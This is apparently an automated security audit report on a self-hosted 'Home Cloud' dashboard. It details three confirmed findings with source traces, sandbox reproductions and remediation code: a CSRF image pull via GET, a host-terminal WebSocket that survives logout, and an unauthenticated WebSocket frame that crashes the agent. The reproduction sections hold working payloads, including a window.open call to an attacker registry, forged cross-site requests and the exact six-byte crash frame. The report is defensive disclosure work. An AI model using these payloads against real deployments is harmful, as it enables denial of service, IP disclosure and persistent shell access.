# Home Cloud: Confirmed Findings Detail (Medium and above), run-2

Generated from `findings.json` (run-2, source `36badc7`). Each record was reproduced in the local bwrap sandbox (dummy secrets, no network) by a Phase-3 verifier, then checked by a separate Phase-5 record verifier.

## Cross-site GET to /api/docker/images/pull makes the host Docker daemon pull an attacker-chosen image

- **Fingerprint:** `home-cloud/csrf/side-effecting-get-image-pull`
- **Severity:** medium. Likelihood medium: Standard CSRF. It needs one visit from a logged-in owner (long 7-day sessions) and a known dashboard hostname. No other bug or browser quirk is required. Impact medium: Fully bypasses the CSRF control for one host action. The host daemon contacts an attacker registry, which reveals the home egress IP, and downloads attacker-sized layers that can fill disk. It does not run code or create containers, so the blast radius is limited.
- **Confidence:** high. The source path is short. The real agent app and the real dockerode client produced the Engine API call in the sandbox, and the controls behaved as expected. Only the browser cookie step relies on documented SameSite=Lax behavior rather than an observed browser.

originGuard only checks Origin/Referer for POST, PUT, PATCH, and DELETE. GET /api/docker/images/pull?image=<ref> is cookie-authenticated and calls docker.pull(ref) on the host daemon. The session cookie is SameSite=Lax, so browsers send it on top-level cross-site GET navigations. Any website the logged-in owner visits can navigate a tab or popup to https://dash.<domain>/api/docker/images/pull?image=registry.attacker.example/x:latest. The host's dockerd then contacts the attacker's registry, which discloses the home egress IP that the tunnel otherwise hides, and downloads arbitrarily large layers onto host disk. I reviewed every other GET route in agent/routes/*.js (settings, network, metrics, file, docker, compose, auth/me) plus /api/ping and /api/health. They are read-only or streaming reads. The only other effects are transient process spawns for search and logs. So this is the only side-effecting GET.

**Root cause:** A state-changing operation (image pull) is exposed as a GET, and the CSRF control (originGuard) exempts GET by design. That leaves only SameSite=Lax, which allows top-level GET navigations.

**Intended behaviour:** Operations that change host state, such as pulling images or contacting registries, should only be reachable through methods covered by the Origin check, or through a GET that rejects cross-site requests.

### Trace
- `entrypoint` `agent/routes/docker.js:301` (router.get('/images/pull')): Cookie-authenticated GET route mounted at /api/docker (agent/index.js:108), reachable by a top-level cross-site navigation.
- `propagation` `agent/middleware/origin.js:44` (stateChangingOriginAllowed): Returns true for any method outside STATE_CHANGING (line 7: POST/PUT/PATCH/DELETE), so GET skips the Origin/Referer check.
- `propagation` `agent/middleware/auth.js:5` (check): Authentication accepts the ambient cookie token. It is SameSite=Lax (agent/routes/auth.js:14), so it is sent on top-level cross-site GET.
- `sink` `agent/routes/docker.js:315` (router.get('/images/pull')): docker.pull(imageName) with the attacker-controlled req.query.image (line 302) issues POST /images/create?fromImage=<ref> to the host Docker daemon.

### Evidence
- `agents/gv1/artifacts/result_1.txt:3`: Verifier sandbox reproduction with fake Docker Engine on unix socket: GET carrying SameSite=Lax cookie and cross-site Referer returns 200 text/event-stream and triggers POST /images/create on engine (lines 2-3). Controls: no cookie returns 401 (line 4); cross-site POST prune returns 403 (line 5).
- `agent/middleware/origin.js:7`: STATE_CHANGING contains only POST, PUT, PATCH, and DELETE.
- `agent/routes/auth.js:14`: The session cookie uses sameSite: 'lax', which browsers send on top-level cross-site GET navigations.
- `agent/routes/docker.js:302`: The image reference comes straight from the query string with no allowlist or registry restriction.
- `dashboard/src/components/apps/DockerApp.tsx:2151`: The dashboard calls this route through EventSource (GET), which explains the method choice.
- `agents/v1/artifacts/result_1.txt:8`: Sandbox run with a fake Docker Engine on a unix socket: a GET carrying the cookie, a cross-site Referer, and Sec-Fetch-Site: cross-site returned 200 text/event-stream (line 7). The engine received POST /images/create?fromImage=registry.attacker.example%2Fprobe&tag=latest. Controls: no cookie gives 401 (line 9), and a POST with a cross-site Referer gives 403 (line 10).

### Conditions
- **user_interaction**: The owner has a valid session cookie (7-day JWT) and visits an attacker-controlled page that triggers a top-level navigation or window.open.
- **environmental_dependency**: The browser applies standard SameSite=Lax behavior, which sends cookies on top-level cross-site GET. A cross-site iframe or fetch would not carry the cookie.
- **data_state**: The attacker knows the dashboard hostname (dash.<domain> or the LAN address).
- **system_configuration**: The host Docker daemon has registry egress, and no registry mirror or proxy hides the host IP.

### Bounded local reproduction
- **Attacker:** A cross-site web attacker who gets the logged-in owner's browser to load a page.
- **Inputs:**
  - `<script>window.open('https://dash.example.com/api/docker/images/pull?image=registry.attacker.example/probe:latest')</script>`
  - `GET /api/docker/images/pull?image=registry.attacker.example%2Fprobe%3Alatest HTTP/1.1
Cookie: token=<owner session>
Referer: https://evil.example/
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate

`
- **Steps:**
  1. Start the real agent app in the sandbox with dummy secrets and DOCKER_HOST pointing at a fake Docker Engine unix socket that logs requests (agents/v1/scratch/v1_harness.cjs).
  2. Log in with the dummy password to obtain the SameSite=Lax cookie.
  3. Send the navigation-shaped GET with the cookie, a cross-site Referer, and no Origin header.
  4. Controls: repeat without the cookie, and send a cross-site POST to /api/docker/images/prune.
- **Observed:** The GET returned 200 text/event-stream, and the fake Docker Engine received POST /images/create?fromImage=registry.attacker.example%2Fprobe&tag=latest. The request without a cookie got 401. The cross-site POST got 403 and caused no engine call. A real browser was not run; the cookie behavior is the standard SameSite=Lax top-level-GET exception.

### Remediation
Move image pull to POST so originGuard covers it, and stream progress from a fetch() POST response in the dashboard instead of EventSource. As defense in depth, have originGuard reject cookie-authenticated API requests with Sec-Fetch-Site: cross-site whatever the method. This still allows same-origin EventSource reads.

`agent/routes/docker.js`:
```js
router.post("/images/pull", async (req, res) => {
	const imageName = req.body && typeof req.body.image === "string" ? req.body.image.trim() : "";
	if (!imageName) {
		return res.status(400).json({ error: "Missing image" });
	}
	// ... unchanged SSE-style streaming body (writeHead text/event-stream, docker.pull, followProgress)
});
```

`dashboard/src/components/apps/DockerApp.tsx`:
```js
const resp = await fetch("/api/docker/images/pull", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ image: imageName }),
});
const reader = resp.body!.getReader();
// parse "data: ...\n\n" chunks exactly as the EventSource onmessage handler did
```

---

## Open host-terminal WebSocket survives logout, logout-all and password change

- **Fingerprint:** `home-cloud/session/websocket-survives-epoch-revocation`
- **Severity:** medium. Likelihood low: Requires a previously stolen/leftover valid cookie and a WebSocket that is already open at the moment the owner revokes; the attacker cannot reconnect afterwards. Impact high: Fully defeats the documented revocation control for the most privileged channel: the retained socket is a host shell (root-equivalent via the docker group) that persists until the attacker disconnects or the service restarts.
- **Confidence:** high. Every cited source line re-read; independently reproduced in the approved sandbox for both logout-all and password change with dummy secrets; containerExec shares the identical connect-time-only check by source inspection.

Session revocation is implemented by bumping a global sessionEpoch that is compared against the JWT only on HTTP requests and at WebSocket upgrade time. No code closes already-open /terminal or /ws/docker/exec sockets (or their PTY/exec streams) when the epoch changes. A holder of a stolen or leftover session cookie who has a host terminal WebSocket open keeps a live root-equivalent host shell after the owner uses 'log out everywhere' or changes the password, even though every new HTTP request and new WebSocket with the same cookie is rejected. README.md:116 and SECURITY.md:92-93 state that the epoch bump rejects old JWTs on HTTP and WebSocket.

**Root cause:** The authorization decision for a WebSocket is made once in handleSystemTerminal (agent/sockets/terminal.js:352-353) and handleContainerExec (agent/sockets/containerExec.js:15-16); the per-message handlers (terminal.js:380-398, containerExec.js:72-83) never re-check the epoch, and incrementSessionEpoch (agent/services/preferences.js:185-190) has no hook that terminates sockets authenticated under the previous epoch.

**Intended behaviour:** Bumping sessionEpoch via /api/auth/logout, /api/auth/logout-all or /api/settings/password should immediately invalidate every credential issued under the previous epoch, including terminating open WebSockets and their host PTY / container exec sessions.

### Trace
- `entrypoint` `agent/index.js:46` (wss connection router): WebSocket upgrade on /terminal is dispatched to handleSystemTerminal after the Origin check.
- `propagation` `agent/sockets/terminal.js:353` (handleSystemTerminal): JWT epoch compared to preferences.getSessionEpoch() only once, at connection time.
- `propagation` `agent/routes/auth.js:205` (POST /api/auth/logout-all): Revocation only increments sessionEpoch and clears the caller's cookie; open sockets are untouched (same at :195 for /logout).
- `propagation` `agent/routes/settings.js:343` (POST /api/settings/password): Password change revokes sessions only by incrementing sessionEpoch.
- `propagation` `agent/services/preferences.js:185` (incrementSessionEpoch): Persists the new epoch; no notification to socket handlers.
- `sink` `agent/sockets/terminal.js:398` (handleSystemTerminal ws.on('message')): Every later message on the already-authorized socket is written to the host PTY without re-checking the epoch.

### Evidence
- `agents/gv1/artifacts/result_2.txt:8`: Verifier sandbox reproduction: after POST /api/auth/logout-all (epoch 2) and POST /api/settings/password (epoch 3), old cookie gets 401 on HTTP endpoints and new WS is closed, but original WS stays OPEN and executes post-revocation marker command (lines 8, 16).
- `agent/sockets/terminal.js:352`: jwt.verify + epoch check performed only inside the connection handler.
- `agent/sockets/containerExec.js:16`: Same connect-time-only epoch check for container exec; stdin forwarding at :83 never re-checks (source-only, no docker daemon in sandbox).
- `agent/sockets/terminal.js:415`: closeAllSessions exists but is only invoked from graceful shutdown (agent/index.js:185-188), not from revocation.
- `agent/middleware/auth.js:12`: HTTP middleware re-checks the epoch per request, which is why HTTP is revoked while open sockets are not.
- `README.md:116`: Documented guarantee: logout and log out everywhere reject old JWTs on HTTP and WebSocket.
- `agents/v3/artifacts/result_1.txt:8`: Independent sandbox run: after logout-all the old cookie gets 401 on /api/auth/me and /api/metrics and a new /terminal WS is closed, but the original WS stays OPEN and executes echo POST_$((200+2)).
- `agents/v3/artifacts/result_1.txt:16`: Same result after POST /api/settings/password (sessionEpoch 3): original WS still executes commands on the host PTY.
- `agents/hb/artifacts/result_1.txt:8`: Hunter's prior run showing the same post-logout-all execution.

### Conditions
- **authentication_level**: Attacker previously obtained a valid session cookie (stolen cookie, shared/unattended device, or a session the owner wants to kill) and opened a /terminal WebSocket before revocation.
- **timing_dependency**: The attacker's WebSocket must remain connected at the moment the owner revokes; a disconnected attacker cannot reconnect with the revoked cookie.
- **user_interaction**: The owner performs logout, logout-all or a password change expecting it to evict the other session.

### Bounded local reproduction
- **Attacker:** Holder of a once-valid owner session cookie with an open host terminal WebSocket, after the owner has revoked all sessions.
- **Inputs:**
  - `WS ws://127.0.0.1:<port>/terminal?sessionId=v3logout_all  (Origin: http://127.0.0.1:<port>, Cookie: token=<old>)`
  - `POST /api/auth/logout-all  (owner action)`
  - `POST /api/settings/password {"currentPassword":"dummy-password-123","newPassword":"dummy-new-password-456"}  (owner action)`
  - `echo POST_$((200+2))\r  sent on the original socket`
- **Steps:**
  1. Load agent/index.js in-process inside the bwrap sandbox with dummy PASSWORD/JWT_SECRET, BASE_DIR=/scratch, HOME_CLOUD_CONFIG_DIR=/scratch/cfg, AGENT_ENV_FILE=/scratch/agent.env and listen on 127.0.0.1:0.
  2. Log in, open /terminal WebSocket with the cookie and matching Origin, send a resize and a marker command, confirm output.
  3. Call POST /api/auth/logout-all with the same cookie; confirm the old cookie now gets 401 over HTTP and a fresh /terminal WS is closed.
  4. Send another marker command on the original socket and observe it executes.
  5. Repeat with a fresh login and POST /api/settings/password as the revocation step.
- **Observed:** For both logout-all (epoch 2) and password change (epoch 3): old cookie 401 on /api/auth/me and /api/metrics, new WS with old cookie closed, original WS readyState=1 and the post-revocation marker command output POST_202 was returned from the host shell.

### Remediation
Track open WebSocket connections together with the epoch they were authorized under, and when incrementSessionEpoch runs (logout, logout-all, password change) close every socket with a stale epoch and destroy its PTY / container exec stream. As defense in depth, re-check the epoch in the message handlers before writing to the PTY or exec stream.

`agent/services/preferences.js`:
```js
const EventEmitter = require("events");
const epochEvents = new EventEmitter();

function incrementSessionEpoch() {
    const currentEpoch = getSessionEpoch();
    const newEpoch = currentEpoch + 1;
    updatePreferences({ sessionEpoch: newEpoch });
    epochEvents.emit("revoked", newEpoch);
    return newEpoch;
}
// export epochEvents alongside the existing functions
```

`agent/sockets/terminal.js`:
```js
// in handleSystemTerminal after successful verification:
const authEpoch = decoded.epoch;
const onRevoked = (newEpoch) => {
    if (newEpoch !== authEpoch) {
        try { session.kill(); } catch {}
        ws.close(4401, "Session revoked");
    }
};
preferences.epochEvents.on("revoked", onRevoked);
ws.on("close", () => preferences.epochEvents.off("revoked", onRevoked));

ws.on("message", (data) => {
    if (preferences.getSessionEpoch() !== authEpoch) {
        ws.close(4401, "Session revoked");
        return;
    }
    // ...existing handling...
});
// apply the same pattern in agent/sockets/containerExec.js and end the exec stream
```

---

## One malformed WebSocket frame from an unauthenticated client kills the agent process and its tunnel

- **Fingerprint:** `home-cloud/websocket/unauthenticated-frame-error-crash`
- **Severity:** high. Likelihood high: A single six-byte frame on an unauthenticated WebSocket upgrade reliably crashes the server with no credentials, user interaction, or race condition required for any LAN client. Impact high: The agent process terminates immediately, dropping every dashboard, API, and terminal session. Repeated 5 times within 60 s, it trips systemd StartLimitBurst=5 and permanently leaves the service in a failed state until manual administrator intervention. Cloudflare tunnel child is also killed, removing remote access entirely.
- **Confidence:** high. Independently verified against the real agent application with stock Node.js in the approved isolated sandbox; complete source trace from connection upgrade to unhandled 'error' event; confirmed control test remains alive; confirmed 5 rapid crashes trip the burst window.

The WebSocket server is constructed on the shared HTTP server (agent/index.js:23) and accepts every upgrade before any application check. The connection handler rejects a foreign Origin with close(1008) (line 41), and both handlers require a cookie JWT (agent/sockets/terminal.js:343-378, agent/sockets/containerExec.js:8-46), but none of them registers an 'error' listener on the socket. The ws library (v8.22.0) reports protocol violations by emitting 'error' on the WebSocket (agent/node_modules/ws/lib/websocket.js:1232). EventEmitter throws when 'error' has no listener, so a masked frame with the RSV1 bit set, an unmasked frame, or an oversized payload raises an uncaught exception and Node exits. No cookie is required: the frame can be sent on an upgrade the agent already rejected as cross-origin, because close(1008) only starts a close handshake and the socket keeps receiving frames. Direct access to port 3000 on all LAN interfaces allows any adjacent network client to send the fatal frame. In production, systemd restarts the service after 5 s, but five crashes in under 60 s trigger StartLimitBurst=5 in home-cloud.service.template, leaving the service in a persistent failed state until manual operator intervention.

**Root cause:** The application does not subscribe to the 'error' event on WebSocket objects it accepts, and has no process-level uncaughtException handler. The ws library turns peer-supplied protocol violations into an emitted 'error' event, and an unhandled EventEmitter 'error' event causes Node.js to throw and exit, allowing any client that can complete a WebSocket upgrade to terminate the host agent process with one frame.

**Intended behaviour:** A malformed frame must terminate only the offending connection with a protocol-error close, without emitting an unhandled error or affecting the agent process, other active sessions, the updater, or the tunnel.

### Trace
- `entrypoint` `agent/index.js:23` (const wss = new WebSocketServer({ server })): ws handles the HTTP server's upgrade event for every path with default options; no server-level upgrade validation rejects the connection before a WebSocket object is created.
- `propagation` `agent/index.js:28` (wss.on("connection", (socket, request) => {): The only connection listener performs shutdown, Origin, and path checks and then dispatches, but never attaches an 'error' listener to the accepted socket.
- `propagation` `agent/index.js:41` (socket.close(1008, "Origin rejected")): A rejected cross-origin socket is not destroyed; close() starts a close handshake, so the peer can continue sending frames until the handshake completes or the default closeTimeout expires.
- `propagation` `agent/sockets/terminal.js:347` (handleSystemTerminal: if (!token) { ws.close(); return; }): With a matching Origin but no cookie, the terminal handler also only closes the socket; no 'error' listener is registered on this path either.
- `sink` `agent/node_modules/ws/lib/websocket.js:1232` (receiverOnError): A protocol violation in the receiver makes ws emit 'error' on the WebSocket. With no listener, EventEmitter throws and the uncaught exception exits the process.

### Evidence
- `agent/index.js:23`: The WebSocketServer is created over the shared HTTP server with no server.on('upgrade') pre-check and no per-socket error handler.
- `agent/index.js:41`: Every non-matching Origin takes this close-only path; close() begins a close handshake but does not destroy the socket, so it remains readable.
- `agent/sockets/terminal.js:347`: The no-cookie path calls ws.close() and returns without registering a socket 'error' listener.
- `agent/node_modules/ws/package.json:3`: The installed ws dependency is pinned at version 8.22.0.
- `agent/node_modules/ws/lib/websocket.js:1232`: receiverOnError emits 'error' on the WebSocket for protocol violations; ws attaches receiver and raw-socket listeners but not a WebSocket 'error' listener.
- `home-cloud.service.template:7`: StartLimitBurst=5 with StartLimitIntervalSec=60s causes systemd to leave the unit in a persistent failed state after 5 successive crashes.
- `agents/gv4/artifacts/result_1.txt:4`: Control: normal WebSocket upgrade without a malformed frame kept the stock Node.js process alive.
- `agents/gv4/artifacts/result_1.txt:6`: Foreign-Origin upgrade returned 101, server sent 1008 'Origin rejected', and masked RSV1 frame c18001020304 caused stock Node.js to exit with code 1 and 'Symbol(status-code): 1002'.
- `agents/gv4/artifacts/result_1.txt:8`: Matching Origin without a cookie: 101, then unmasked frame 8100 caused stock Node.js to exit with code 1 and 'Symbol(status-code): 1002'.
- `agents/gv4/artifacts/result_1.txt:10`: Authenticated connection with valid login cookie and the same RSV1 frame also caused stock Node.js to exit with code 1.
- `agents/gv4/artifacts/result_1.txt:12`: 5 successive crashes were triggered in 1.6s, verifying that repeated crashes trip systemd StartLimitBurst=5 within the 60s window.

### Conditions
- **authentication_level**: None. The fatal frame works on a cross-origin upgrade the agent already rejected, and on a matching-Origin upgrade with no session cookie.
- **network_routing**: Direct TCP reachability to port 3000 on the local network (all interfaces 0.0.0.0 by default) is confirmed. For remote traffic through dash.<domain> via Cloudflare Tunnel, reachability is conditional: cloudflared and Cloudflare's edge proxy terminate and re-frame WebSocket connections; whether malformed protocol frames (such as RSV1 or unmasked frames) are forwarded to localhost:3000 or rejected at the edge/tunnel proxy is outside repository source visibility and requires owner observation.
- **system_configuration**: Default ws options (no per-socket error listener or maxPayload override) and stock systemd unit configuration (home-cloud.service.template: Restart=always, RestartSec=5s, StartLimitIntervalSec=60s, StartLimitBurst=5).
- **timing_dependency**: The frame only needs to arrive while the socket is still in the close handshake; a frame pipelined after the upgrade or after the 1008 close frame is sufficient. No race with close was required in testing.

### Bounded local reproduction
- **Attacker:** Unauthenticated client on the LAN (http://<host>:3000) with no session cookie, or any client with direct TCP access to the HTTP port.
- **Inputs:**
  - `GET /terminal HTTP/1.1
Host: <host>:3000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13
Origin: http://rebind.attacker.test

`
  - `c1 80 01 02 03 04`
- **Steps:**
  1. Start the unmodified agent in the sandbox with dummy PASSWORD, JWT_SECRET, and BASE_DIR on 127.0.0.1 using stock Node.js.
  2. Open /terminal with a foreign Origin and no cookie; read the 101 response and the 1008 'Origin rejected' close frame.
  3. Send the six-byte masked RSV1 frame (c1 80 01 02 03 04) without waiting for the close handshake.
  4. Observe the child process exit with code 1; repeat with a matching Origin and no cookie using unmasked 81 00, and with a valid dummy login cookie and the RSV1 frame.
  5. Control: repeat the upgrade without sending a frame and confirm the process stays alive.
  6. Trigger 5 successive crashes within 60s to demonstrate exceeding the systemd StartLimitBurst threshold.
- **Observed:** All connections completed the HTTP upgrade with 101. The no-frame control stayed alive. The foreign-Origin frame produced an unhandled EventEmitter error on stock Node.js, exiting with code 1 (status code 1002 protocol error). The matching-Origin, no-cookie unmasked frame produced the same exit with code 1. The authenticated connection also killed the process. 5 successive crashes were triggered in 1.6s, well within the 60s systemd StartLimitIntervalSec window.

### Remediation
Attach an 'error' listener to every WebSocket the server accepts, before any close or dispatch, so protocol errors are contained to that socket (log and terminate it). As defense in depth, reject disallowed upgrades earlier with server.on('upgrade') or a noServer WebSocketServer, and set a small maxPayload.

`agent/index.js`:
```js
const wss = new WebSocketServer({ server, maxPayload: 1024 * 1024 });

wss.on("connection", (socket, request) => {
	socket.on("error", (err) => {
		console.warn("[ws] client error:", err.message);
		socket.terminate();
	});

	if (isShuttingDown) {
		socket.close(1001, "Server is shutting down");
		return;
	}
	// ... existing origin/path checks and dispatch
});
```

---


Note on the high-severity WebSocket record: the persistent outage via systemd StartLimitBurst is inferred from home-cloud.service.template; the sandbox observed five process crashes in 1.6 s, not systemd behaviour.
